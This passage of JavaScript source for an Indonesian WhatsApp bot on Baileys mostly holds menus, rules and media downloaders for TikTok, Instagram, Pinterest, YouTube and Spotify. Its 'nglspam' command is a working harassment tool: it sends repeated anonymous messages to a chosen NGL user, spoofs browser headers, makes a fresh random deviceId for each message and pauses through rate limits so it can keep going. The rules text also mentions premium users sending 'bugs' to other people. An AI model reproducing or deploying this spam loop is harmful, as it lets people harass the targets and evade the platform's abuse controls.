            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            id: `stickermenubutton`, 
          },
          {
            title: "ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            id: `quotesmenubutton`, 
          },
          {
            title: "sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            id: `stalkermenubutton`, 
          },
        ]},
      {
        title: `ᴀᴅᴍɪɴ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`, 
        highlight_label: `ᴅɪɴᴢɪᴅ ᴄʜx`,
        rows: [
          {
            title: "ɪɴғᴏ ʙᴏᴛ",
            description: "ɪɴғᴏʀᴍᴀsɪ ᴛᴏᴛᴀʟ ғɪᴛᴜʀ ᴅᴀɴ ʟᴀɪɴɴʏɴ",
            id: `infobotbutton`,
            },
            {
             title: "ᴍᴇɴᴜ  sɪᴍᴘʟᴇ",
            description: "ɪɴғᴏʀᴍᴀsɪ ᴛᴏᴛᴀʟ ғɪᴛᴜʀ ᴅᴀɴ ʟᴀɪɴɴʏɴ",
            id: `menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}
break
case 'donasibutton': {
const url = "https://telegra.ph/file/65469aa05e05c2543469c.jpg";
  async function image(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: { url }
    }, {
      upload: TradzSigma.waUploadToServer
    });
    return imageMessage;
  }
  let msg = generateWAMessageFromContent(
    m.chat,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: `> halo kak ${pushname}`
            },
            carouselMessage: {
              cards: [
                {
                  header: proto.Message.InteractiveMessage.Header.create({
                    ...(await prepareWAMessageMedia({ image: { url: './library/data/image/thumb.jpg' } }, { upload: TradzSigma.waUploadToServer })),
                    title: '',
                    gifPlayback: true,
                    subtitle: ownername,
                    hasMediaAttachment: false
                  }),
                  body: { text: `> KLIK TOMBOL DIBAWAH UNTUK MENUJU KE WEBSITE OWNER` },
                  nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"WEBSITE OWNER )","url":"https://youtu.be/dz1MhkbPthI","merchant_url":"https://youtu.be/dz1MhkbPthI"}`
                    },
                  ],
                  },
                },
              ],
              messageVersion: 1,
            },
          },
        },
      },
    },
    { quoted: m }
  );

  await TradzSigma.relayMessage(msg.key.remoteJid, msg.message, {
    messageId: msg.key.id,
  });
}
break
case 'bacaperaturanbutton': {
  const cap = `┏━━━°❀ ❬ *Rules ${namabot} MultiDevice* ❭ ❀°━━━┓

1. ✧ *Dilarang Melakukan Spam Kepada Bot*, Jika Ketahuan Akan Di Banned.

2. ✧ Jika Bot Tidak Menjawab 1x, Silahkan Dicoba Lagi. Tapi Jika Bot Tidak Menjawab 2x, Itu Artinya Delay, Jangan Dipakai Dulu.

3. ✧ *Jangan Spam Bot, Kalau Belum Donasi, Sadar Diri Aja Makenya* :)

4. ✧ Jika Limit Habis, Silahkan Bermain Game Untuk Mendapatkan Exp. Contoh Game: Tebak-Tebakan, RPG Game, dll.

5. ✧ *Dilarang Mengirim Virtex/Bug Ke Bot*, Walaupun Tidak Ada Efeknya :v

6. ✧ *Dilarang Keras Menelpon Bot*, Jika Menelpon Akan Otomatis Diblokir.

7. ✧ Jika Tidak Mengerti Cara Menggunakan Bot, Silahkan Bertanya Pada Member Lain. Atau Jika Belum Join Group Bot, Ketik #gcbot Dan Masuk Group Bot.

8. ✧ Jika Ada Fitur Error/Tidak Mengerti Cara Menggunakannya, Silahkan Laporkan/Tanyakan Kepada Owner.

9. ✧ Jika Bot Delay, Jangan Di Spam Terlebih Dahulu.

10. ✧ Untuk User *Premium*, *Dilarang Keras Mengirim Bug Asal Ke Orang Lain*.

┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
`
replyviex(cap)
}
break
case 'infobot': {
  replyviex(`*╭─❒ 「 INFORMASI ${namabot} 」*
├ OWNER: *${ownername}*
├ VERSI: *0.0.1*
├ RUNTIME: *${runtime(process.uptime())}*
├ RAM: *${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}*
╰─❒

*✦ INFORMASI SISTEM ✦*
Bot ini sedang aktif dan siap membantu kamu! 
Nikmati fitur-fitur canggih yang kami tawarkan untuk memudahkan kegiatanmu. 
Jangan lupa update terus ya biar tetap dapet fitur terbaru!

Terima kasih telah menggunakan bot kami! 😊
`)
}
break
//case 'setreply': {
//if (!TradID) return reply(mess.owner)
//if ((args[0]) === 'v1'|| (args[0]) === 'V1' ){
//setreply = "v1"
//reply(`📑 *Berhasil Beralih Kedalam Reply v1*`)
//} else if ((args[0]) === 'v2'|| (args[0]) === 'V2' ){
//setreply = "v2"
//reply(`📑 *Berhasil Beralih Kedalam Reply v2*`)
//} else if ((args[0]) === 'v3'|| (args[0]) === 'V3' ){
//setreply = "v3"
//reply(`📑 *Berhasil Beralih Kedalam Reply v3*`)
//} else if ((args[0]) === 'v4'|| (args[0]) === 'V4' ){
//setreply = "v4"
//reply(`📑 *Berhasil Beralih Kedalam Reply v4*`)
//}  else if (!q) {
//reply(`📑 *Reply Yang Tersedia*
 //*⨠ v1*
// *⨠ v2*
 //*⨠ v3*
// *⨠ v4*

//📑 *Contoh : setreply v1* `)
//
//} else {
//replyyoimiya("⚠️ *Menu Tidak Ditemukan*")
//}
//}
break 
case 'pinvid': case 'pinterestvideo': case 'pinvideo': {
    if (!text) return replyviex('ᴍᴀsᴜᴋᴋᴀɴ ᴋᴀᴛᴀ ᴋᴜɴᴄɪ ᴜɴᴛᴜᴋ ᴍᴇɴᴄᴀʀɪ ᴠɪᴅᴇᴏ ᴅɪ ᴘɪɴᴛᴇʀᴇsᴛ !');
    async function PinterestVid(teks) {
        const url = `https://id.pinterest.com/resource/BaseSearchResource/get/?_=1619980301559&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${encodeURIComponent(teks)}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&source_url=%2Fsearch%2Fpins%2F%3Fq%3D${encodeURIComponent(teks)}`;
        try {
            const response = await axios.get(url);
            const data = response.data;
            if (!data || !data.resource_response || !data.resource_response.data || !data.resource_response.data.results) {
                return []; // Return an empty array if the structure is not as expected
            }
            const results = data.resource_response.data.results;
            const videoUrls = results
                .filter(pin => pin.story_pin_data) // Ensure story_pin_data exists
                .flatMap(pin => {
                    const pages = pin.story_pin_data.pages;
                    if (pages && pages.length > 0) {
                        const blocks = pages[0].blocks;
                        if (blocks && blocks.length > 0) {
                            const videoList = blocks[0].video && blocks[0].video.video_list;
                            if (videoList) {
                                return Object.values(videoList)
                                    .map(video => video.url)
                                    .filter(url => url); // Filter out empty URLs
                            }
                        }
                    }
                    return [];
                });
            return videoUrls;
        } catch (error) {
            return { error: error.message };
        }
    }

    const result = await PinterestVid(text);
    if (result.error) {
        reply(`Terjadi kesalahan: ${result.error}`);
    } else if (result.length === 0) {
        reply('ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ');
    } else {
        reply(`Hasil nya nih puqimak:\n\n${result.join('\n')}`);
    }}
    break
case 'request':
case 'req':
case 'saran': {
  if (!text) return m.reply('Tulis request Anda!');

  const user = m.sender;
  const now = Date.now();

  if (!saranCooldown[user]) saranCooldown[user] = 0;

  if (now - saranCooldown[user] < saranDelay) {
    const wait = ((saranDelay - (now - saranCooldown[user])) / 1000).toFixed(1);
    return m.reply(`⏳ Tunggu *${wait} detik* sebelum mengirim request lagi.`);
  }

  saranCooldown[user] = now; // Set waktu cooldown baru

  try {
    const senderName = await TradzSigma.getName(m.sender); // Ambil nama WA
    const imageBuffer = await createNGLImage(text, senderName); // Kirim ke fungsi dengan nama

    await TradzSigma.sendMessage(global.my.idch, {
      image: imageBuffer,
      caption: `💬 Dari @${user.split('@')[0]}`,
      mentions: [m.sender]
    });

    await m.reply('✅ Request kamu sudah terkirim ke channel!');
  } catch (e) {
    console.error('Error:', e);
    await m.reply('❌ Gagal mengirim request.');
  }
  break;
}

case 'playmusik': {
	if (!text) return replyviex(`ᴄᴏɴᴛᴏʜ: .playmusik ᴘᴇsᴀɴ ᴛᴇʀᴀᴋʜɪʀ `)
	try {		
		let search = await yts(`${text}`);
		if (!search || search.all.length === 0) return replyviex(`*ʟᴀɢᴜ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ !* ☹️`);
		
		let { videoId, image, title, views, duration, author} = search.all[0];
		let caption = `「  *🎶 ʏ ᴏ ᴜ ᴛ ᴜ ʙ ᴇ  -  ᴘ ʟ ᴀ ʏ 🎶*  」
		ᴠɪᴇᴡs : ${views}
		ᴅᴜʀᴀsɪ : ${duration.timestamp}
		ᴄʜᴀɴɴᴇʟ : ${author.name}
		ᴜᴘʟᴏᴀᴅ : ${ago}`;
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
  "messageContextInfo": {
    "deviceListMetadata": {},
    "deviceListMetadataVersion": 2
  },
  interactiveMessage: proto.Message.InteractiveMessage.create({
   contextInfo: {
   mentionedJid: [m.sender]
    }, 
    body: proto.Message.InteractiveMessage.Body.create({
    text: caption
    }),
    footer: proto.Message.InteractiveMessage.Footer.create({
     text: `${global.footer}`,
    }),
    header: proto.Message.InteractiveMessage.Header.create({
    subtitle: "",
    hasMediaAttachment: true,...(await prepareWAMessageMedia({ 
         image: { url: image }
}, { upload: TradzSigma.waUploadToServer }))
    }),
    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [{
		 "name": "single_select",
		 "buttonParamsJson": `{
  "title": "Pilih",
  "sections": [
    {
      "title": "ᴅᴏᴡɴʟᴏᴀᴅ ᴀᴜᴅɪᴏ ʏᴏᴜᴛᴜʙᴇ 🎧",
      "rows": [
        {
          "header": "ᴀᴜᴅɪᴏ ᴅᴏᴡɴʟᴏᴀᴅ",
          "title": "ʏᴏᴜᴛᴜʙᴇ ᴀᴜᴅɪᴏ ᴜʟᴛʀᴀ ǫᴜᴀʟɪᴛʏ",
          "id": "ytmp3 ${url}"
        }
      ]
    },
    {
      "title": "ᴅᴏᴡɴʟᴏᴀᴅ ᴠɪᴅᴇᴏ ʏᴏᴜᴛᴜʙᴇ 🗃️",
      "rows": [
        {
          "header": "ᴠɪᴅᴇᴏ ᴅᴏᴡɴʟᴏᴀᴅ",
          "title": "ʏᴏᴜᴛᴜʙᴇ ᴠɪᴅᴇᴏ ᴜʟᴛʀᴀ ǫᴜᴀʟɪᴛʏ",
          "id": "ytmp4 ${url}"
        }
      ]
    }
  ]
}`
}],
})})}}
}, { userJid: m.chat, quoted: m })
TradzSigma.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id })
	} catch (err) {
	 replyviex('Terjadi Kesalahan Dalam Fitur Silahkan Lapor ketik *.raport teks*');
	}
}
break
case 'tagsw': {
    const baileys = require("baileys");

    async function fetchParticipants(...jids) {
        let results = [];
        for (const jid of jids) {
            let { participants } = await TradzSigma.groupMetadata(jid);
            participants = participants.map(({ id }) => id);
            results = results.concat(participants);
        }
        return results;
    }

    async function mentionStatus(jids, content) {
        const msg = await baileys.generateWAMessage(baileys.STORIES_JID, content, {
            upload: TradzSigma.waUploadToServer
        });

        let statusJidList = [];
        for (const _jid of jids) {
            if (_jid.endsWith("@g.us")) {
                for (const jid of await fetchParticipants(_jid)) {
                    statusJidList.push(jid);
                }
            } else {
                statusJidList.push(_jid);
            }
        }
        statusJidList = [...new Set(statusJidList)];

        await TradzSigma.relayMessage(msg.key.remoteJid, msg.message, {
            messageId: msg.key.id,
            statusJidList,
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: jids.map((jid) => ({
                                tag: "to",
                                attrs: { jid },
                                content: undefined
                            }))
                        }
                    ]
                }
            ]
        });

        for (const jid of jids) {
            let type = jid.endsWith("@g.us") ? "groupStatusMentionMessage" : "statusMentionMessage";
            await TradzSigma.relayMessage(jid, {
                [type]: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            }, {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "true" },
                        content: undefined
                    }
                ]
            });
        }

        return msg;
    }

    let q = m.quoted ? m.quoted : m;
    let mime = (q.msg || q).mimetype || '';
    let content = {};

    if (mime) {
        let media = await q.download();

        if (/image/.test(mime)) {
            content.image = media;
        } else if (/video/.test(mime)) {
            content.video = media;
        } else if (/audio/.test(mime)) {
            content.audio = media;
        } else {
            return m.reply("Jenis file tidak didukung!");
        }

        if (q.text) content.caption = q.text;
    } else if (args[0]) {
        let url = args[0];
        let type = args[1] || 'text';

        if (type === 'image') {
            content.image = { url };
        } else if (type === 'video') {
            content.video = { url };
        } else if (type === 'audio') {
            content.audio = { url };
        } else {
            content.text = args.slice(1).join(" ") || url;
        }
    } else {
        return reply("Reply media atau masukkan URL dengan format:\n.tagsw <url> <image/video/audio/text>");
    }

    mentionStatus([m.chat], content).catch(console.error);
}
break;
case 'sholat': {
    const city = 'Jakarta'; // Ganti dengan kota
    const country = 'Indonesia'; // Ganti dengan negara
    startPrayerReminder(TradzSigma, city, country);
    replyviex(`🕋 Pengingat sholat untuk *${city}, ${country}* diaktifkan di semua grup!`);
}
break
case 'play':
case "ytplay":
            case "ply":
            case "pl": {
    if (!isRegistered) return replydaftar("...");

    if (!text) return replyviex("MASUKAN JUDULNYA !");
    m.reply(mess.wait);

    try {
        const r = await ytSearch(text);
        const video = r.videos[0];

        if (!video) return replyviex("❌ Tidak ditemukan video!");

        let url = video.url;
        let teks = `- Title: ${video.title}\n\n- Description: ${video.description}`;

        TradzSigma.sendMessage(m.chat, {
            image: { url: video.thumbnail },
            caption: teks,
            footer: "𝚢𝚘𝚞𝚝𝚞𝚋𝚎 𝚍𝚘𝚠𝚗𝚕𝚘𝚊𝚍𝚎𝚛",
            buttons: [
                {
                    buttonId: `.ytmp4 ${url}`,
                    buttonText: { displayText: 'Video | Mp4' },
                    type: 1
                },
                {
                    buttonId: `.yta ${url}`,
                    buttonText: { displayText: 'Audio | Mp3' },
                    type: 1
                },
            ],
            headerType: 1,
            viewOnce: true
        }, { quoted: qloc });

    } catch (e) {
        console.error(e);
        replyviex("❌ Terjadi kesalahan saat mencari video.");
    }
}
break;


case 'chord':
case 'cr': {
  if(!text) return reply(`masukan query`);
  let anu = `https://api.diioffc.web.id/api/search/chord?query=${encodeURIComponent(text)}`;
  const res = await fetch(anu)
  const response = await res.json();
  reply(`Url: ${response.result.url}\nArtis: ${response.result.artist}\nArtisUrl: ${response.result.artistUrl}\nJudul: ${response.result.title}\nChord: ${response.result.chord}`), { quoted: m };
}
break
case 'instagram':
case 'ig': {
        if (!text) return reply(`mana link instagram-nya? contoh: ${prefix + command} https://www.instagram.com/reel/DB8BGCZRKAh/?igsh=eDk1ajRncDV6Mjdh`);
    
        let memek = await igdl(text);
    
        let respon = memek.data;
        if (respon && respon.length > 0) {
        
            let uniqueUrls = new Set(respon.map(item => item.url));
            try {
                for (let mediaUrl of uniqueUrls) {
                    const headResponse = await axios.head(mediaUrl);
                    const mimeType = headResponse.headers['content-type'];

                    const isImage = /image\/.*/.test(mimeType);
                    const isVideo = /video\/.*/.test(mimeType);

                    if (isImage) {
                        await TradzSigma.sendMessage(m.chat, {
                            image: { url: mediaUrl },
                            caption: "berhasil mendownload gambar dari URL."
                        }, { quoted: m });
                    } else if (isVideo || mimeType === 'application/octet-stream') {
                        await TradzSigma.sendMessage(m.chat, {
                            video: { url: mediaUrl },
                            caption: "乂 *I N S T A G R A M  D O W N L O A D* 乂"
                  
                        }, { quoted: m });
                    } else {
                        await TradzSigma.sendMessage(m.chat, {
                            text: `tipe media tidak didukung: ${mimeType}`
                        }, { quoted: m });
                    }
                }
            } catch (error) {
                console.error('Error fetching media type:', error);
                reply(error)
            }
        } else {
            await TradzSigma.sendMessage(m.chat, {
                text: "Tidak ditemukan media atau terjadi kesalahan saat mengambil media."
            }, { quoted: m });
        }
    }
    break;
      case'tt5':{
        if (!text) return reply(`mana link tiktok nya? contoh ${prefix + command} https://`);
         let res = await tiktok(text);
         if (res && res.data && res.data.data) {
            let images = res.data.data.images || [];
            let play = res.data.data.play;
            let lagu = res.data.data.music

            const getMimeType = async (url) => {
                try {
                    const response = await axios.head(url);
                    return response.headers['content-type'];
                } catch (error) {
                    console.error(error);
                    return
                }
            };

            let mimeType = await getMimeType(play);
            
            if (mimeType && mimeType.startsWith('video/')) {
                await TradzSigma.sendMessage(m.chat, {
                    video: { url: play },
                    caption: "Successfully downloaded video from TikTok"
                },{quoted:m});
            } else if (images.length > 0) {
                let totalImages = images.length;
                let estimatedTime = totalImages * 4;
                let message = `Estimasi waktu pengiriman gambar: ${estimatedTime} detik.`;
                await TradzSigma.sendMessage(m.chat, { text: message },{quoted:m});

                const sendImageWithDelay = async (url, index) => {
                    let caption = `Gambar ke-${index + 1}`;
                    await TradzSigma.sendMessage(m.chat, { image: { url }, caption: caption },{quoted:m});
                };
                await TradzSigma.sendMessage(m.chat, { audio: { url: lagu }, mimetype: "audio/mpeg" },{quoted:m})

                for (let i = 0; i < images.length; i++) {
                    await sendImageWithDelay(images[i], i);
                    await new Promise(resolve => setTimeout(resolve, 4000));
                }
            } else {
                console.log('No valid video or images found.');
                await TradzSigma.sendMessage(m.chat, {
                    text: "No media found or an error occurred while retrieving media."
                },{quoted:m});
            }
        } else {
            console.error('Error: Invalid response structure', res);
            await TradzSigma.sendMessage(m.chat, {
                text: "No media found or an error occurred while retrieving media."
            },{quoted:m});
        }
      }
      break
      case 'jadihd':{
if (!m.quoted) return reply("Reply photo nya bloon")
const { remini } = require('./library/scrape/remini')
let media = await quoted.download()
let proses = await remini(media, "enhance");
TradzSigma.sendMessage(m.chat, { image: proses, caption:"Nihh Gambarnya jadi HD"}, { quoted: m})
}
break
      case 'nglspam': {
if (!TradID) return reply(mess.prem)
 if (!text.split("|")[0] || !text.split("|")[1] || !text.split("|")[2]) {
 return replyviex("Masukan username, pesan, dan jumlah spam!\nContoh: .nglspam Dinz|haloo|5");
 }
async function sendSpamMessage(username, message, spamCount) {
 let counter = 0;
 while (counter < spamCount) {
 try {
 const date = new Date();
 const minutes = date.getMinutes();
 const hours = date.getHours();
 const formattedDate = `${hours}:${minutes}`;
 const deviceId = crypto.randomBytes(21).toString('hex');
 const url = 'https://ngl.link/api/submit';
 const headers = {
 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
 'Accept': '*/*',
 'Accept-Language': 'en-US,en;q=0.5',
 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
 'X-Requested-With': 'XMLHttpRequest',
 'Sec-Fetch-Dest': 'empty',
 'Sec-Fetch-Mode': 'cors',
 'Sec-Fetch-Site': 'same-origin',
 'Referer': `https://ngl.link/${username}`,
 'Origin': 'https://ngl.link'
 };
 const body = `username=${username}&question=${message}&deviceId=${deviceId}&gameSlug=&referrer=`;

 const response = await fetch(url, {
 method: 'POST',
 headers,
 body,
 mode: 'cors',
 credentials: 'include'
 });

 if (response.status !== 200) {
 console.log(`[${formattedDate}] [Err] Ratelimited`);
 await new Promise(resolve => setTimeout(resolve, 25000));
 } else {
 counter++;
 console.log(`[${formattedDate}] [Msg] Sent: ${counter}`);
 }
 } catch (error) {
 console.error(`[${formattedDate}] [Err] ${error}`);
 await new Promise(resolve => setTimeout(resolve, 5000));
 }
 }
};
 const [username, message, count] = text.split("|");
 const spamCount = parseInt(count, 10);

 if (isNaN(spamCount) || spamCount <= 0) {
 return replyviex("Jumlah spam harus berupa angka positif!");
 }

 try {
 await sendSpamMessage(username, message, spamCount);
 replyviex(`Sukses mengirim ${spamCount} pesan NGL ke ${username}`);
 } catch (e) {
 console.error(e); // Menambahkan logging error untuk debug
 return replyviex("Fitur error, coba lagi nanti.");
 }
}
//D|ts si pler 🐎
break 
case 'spoiler':
case 'readmore':
case 'selengkapnya': {
if (!q) return reply(`masukan text contoh ${command} kamujelek|tapii boong`)
let [l, r] = text.split`|`
if (!l) l = ''
if (!r) r = ''
reply(l + readmore + r)
}
break

case 'tiktok': case 'tt': {
 let momok = "`𝗧 𝗜 𝗞 𝗧 𝗢 𝗞 - 𝗗 𝗢 𝗪 𝗡 𝗟 𝗢 𝗔 𝗗`"
if (!text.startsWith("https://")) return replyviex(example("url"))
await tiktokDl(q).then(async (result) => {
await TradzSigma.sendMessage(m.chat, {react: {text: '🔍', key: m.key}})
if (!result.status) return replyviex("Error!")
if (result.durations == 0 && result.duration == "0 Seconds") {
let araara = new Array()
let urutan = 0
for (let a of result.data) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: TradzSigma.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `Foto Slide Ke *${urutan += 1}*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*TIKTOK - DOWNLOADER*"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await TradzSigma.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
} else {
let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")

await TradzSigma.sendMessage(m.chat,{
			 video: {url:urlVid.url},
					caption: momok,
					footer: `\n${global.namabot}`,
					buttons: [
						{
							buttonId: `.ttaudio ${text}`,
							buttonText: {
								displayText: "ᴀᴍʙɪʟ ᴍᴜsɪᴋɴʏᴀ"
							}
						},
					],
					viewOnce: true,
				}, {
					quoted: m
				});
}
}).catch(e => console.log(e))
await TradzSigma.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
}
break
case 'reactchs':
case 'reactch1':
case 'rch': {
    if (!args[0]) return replyviex("Gunakan command dengan cara:\n\`Contoh\`:\n.rch linkpesan saya bang☝");
    if (!args[0].startsWith("https://whatsapp.com/channel/")) {
        return replyviex("Link tautan tidak valid.");
    }

    const hurufGaya = {
        a: '🅐', b: '🅑', c: '🅒', d: '🅓', e: '🅔', f: '🅕', g: '🅖',
        h: '🅗', i: '🅘', j: '🅙', k: '🅚', l: '🅛', m: '🅜', n: '🅝',
        o: '🅞', p: '🅟', q: '🅠', r: '🅡', s: '🅢', t: '🅣', u: '🅤',
        v: '🅥', w: '🅦', x: '🅧', y: '🅨', z: '🅩',
        '0': '⓿', '1': '➊', '2': '➋', '3': '➌', '4': '➍',
        '5': '➎', '6': '➏', '7': '➐', '8': '➑', '9': '➒'
    };

    const emojiInput = args.slice(1).join(' ').toLowerCase();
    const emoji = emojiInput.split('').map(c => {
        if (c === ' ') return '―';
        return hurufGaya[c] || c;
    }).join('');

    try {
        const link = args[0];
        const channelId = link.split('/')[4];
        const messageId = link.split('/')[5];

        const res = await TradzSigma.newsletterMetadata("invite", channelId);
        await TradzSigma.newsletterReactMessage(res.id, messageId, emoji);

        return replyviex(`Berhasil mengirim reaction *${emoji}* ke pesan di channel *${res.name}*.`);
    } catch (e) {
        console.error(e);
        return replyviex("Gagal mengirim reaction. Pastikan link dan emoji valid.");
    }
};
break
case 'autoreadsw': {
  if (!TradID) return m.reply('❌ Fitur ini hanya untuk owner.');

  if (text === 'on') {
    global.autoreadStory = true;
    m.reply('✅ Auto-read story telah *diaktifkan*.');
  } else if (text === 'off') {
    global.autoreadStory = false;
    m.reply('✅ Auto-read story telah *dinonaktifkan*.');
  } else {
    m.reply('📘 Penggunaan: *.autoreadstory on* atau *.autoreadstory off*');
  }
  break;
}
    case "hd5": {
if (!quoted) return replyviex(`Balas gambar dengan caption ${prefix + command}`);
if (!/image/.test(mime)) return replyviex("dengan kirim/reply foto")
await TradzSigma.sendMessage(m.chat, {react: {text: '🔍', key: m.key}})
try {
const { remini } = require("./lib/hd.js");
let media = await quoted.download();
let enhanced = await remini(media, "enhance"); // Enhance pertama
enhanced = await remini(enhanced, "enhance"); // Enhance kedua
enhanced = await remini(enhanced, "enhance"); // Enhance ketiga    
TradzSigma.sendFile(m.chat, enhanced, "", "_Sukses Membuat HD 3x Enhance✅_", m);
} catch (err) {
console.error(err);
await TradzSigma.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}
}
break;
case 'pin':
case 'pinterest': {
    if (!text) return replyviex(`Format salah, contoh: \n${prefix + command} Anime`)

    await TradzSigma.sendMessage(m.chat, {react: {text: '⏳', key: m.key}})
    
    let anutrest = await pinterest(text) // Ambil hasil pencarian
    if (!anutrest || anutrest.length === 0) return reply("Error, Foto Tidak Ditemukan")

    // Ambil maksimal 10 gambar biar nggak terlalu panjang
    let selectedImages = anutrest.slice(0, 10);
    let anu = []

    for (let i = 0; i < selectedImages.length; i++) {
        let imgsc = await prepareWAMessageMedia(
            { image: { url: selectedImages[i].image } }, 
            { upload: TradzSigma.waUploadToServer }
        )

        anu.push({
            header: proto.Message.InteractiveMessage.Header.fromObject({
                title: `Gambar ke *${i + 1}*`, 
                hasMediaAttachment: true,
                ...imgsc
            }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [{
                    name: "cta_url",
                    buttonParamsJson: JSON.stringify({
                        display_text: "Lihat di Pinterest",
                        url: selectedImages[i].source || selectedImages[i].image
                    })
                }]
            }), 
            footer: proto.Message.InteractiveMessage.Footer.create({
                text: "TradzSigma - JinshiMD"
            })
        })
    }

    // Buat format `carouselMessage`
    const msg = await generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `🔎 Berikut hasil pencarian gambar untuk *${text}*`
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards: anu
                    })
                })
            }
        }
    }, {
        userJid: sender,
        quoted: m
    })

    TradzSigma.relayMessage(m.chat, msg.message, { messageId: msg.key.id })
}
break
//===============================
case 'spotifysearch': {
 if (!text) return replyviex(`Masukkan judul yang ingin di search, Contoh: ${prefix + command} suzume`);

 const searchQuery = text.trim();
 replyviex('🔍 Sedang mencari hasil, mohon tunggu sebentar...');

 try {
 const searchResponse = await axios.get(`http://kinchan.sytes.net/spotify/search?query=${encodeURIComponent(searchQuery)}`);
 const searching = searchResponse.data.data;

 if (!searching || !searching.tracks || searching.tracks.length === 0) {
 return replyviex('❌ Tidak ditemukan hasil untuk pencarian ini.');
 }

 let resultText = `🎵 *Hasil Pencarian Spotify untuk:* "${searchQuery}"\n\n`;
 searching.tracks.forEach((track, index) => {
 resultText += `*${index + 1}. ${track.title}*\n`;
 resultText += `🎤 *Artis:* ${track.artists}\n`;
 resultText += `💿 *Album:* ${track.album}\n`;
 resultText += `⏳ *Duration:* ${Math.floor(track.duration / 60000)}:${((track.duration % 60000) / 1000).toFixed(0).padStart(2, '0')} menit\n`;
 resultText += `📅 *Release:* ${track.release_date}\n`;
 resultText += `🔗 *Spotify Link:* ${track.link}\n`;
 resultText += `🆔 *ISRC:* ${track.isrc}\n`;
 resultText += `\n━━━━━━━━━━━━━━━━━━━━━━\n\n`;
 });

 await TradzSigma.sendMessage(m.chat, {
 image: { url: searching.tracks[0].cover_url },
 caption: resultText.trim()
 }, { quoted: m });

 } catch (error) {
 console.error(error);
 replyviex('❌ Terjadi kesalahan saat mencari hasil, silahkan coba lagi.');
 }
}
break
case 'spotifydl': {
    if (!text) return replyviex(`Silahkan berikan link, Contoh: ${prefix + command} https://open.spotify.com/track/2ROE7pfI8Monc5n13T3Tmt`);

    const spotifyLink = text.trim();

    try {
        const metaResponse = await axios.get(`http://kinchan.sytes.net/spotify/meta?url=${encodeURIComponent(spotifyLink)}`);
        const metadata = metaResponse.data.data;

        if (!metadata.title || !metadata.artists) {
            return reply('❌ Gagal mengambil metadata, pastikan link benar');
        }

     replyviex(`*乂 SPOTIFY - DOWNLOADER*\n\n` +
            `🎶 *Judul:* ${metadata.title}\n` +
            `🎤 *Artis:* ${metadata.artists}\n` +
            `💿 *Album:* ${metadata.album}\n` +
            `⏳ *Duration:* ${Math.floor(metadata.duration / 60000)}:${((metadata.duration % 60000) / 1000).toFixed(0).padStart(2, '0')} menit\n` +
            `📅 *Release:* ${metadata.release_date}\n\n` +
            `> audio sedang di proses, silahkan tunggu sebentar...`);

        const downloadResponse = await axios.get(`http://kinchan.sytes.net/spotify/downloader?track=${encodeURIComponent(spotifyLink)}&title=${encodeURIComponent(metadata.title)}&artist=${encodeURIComponent(metadata.artists)}`);
        const downloader = downloadResponse.data;

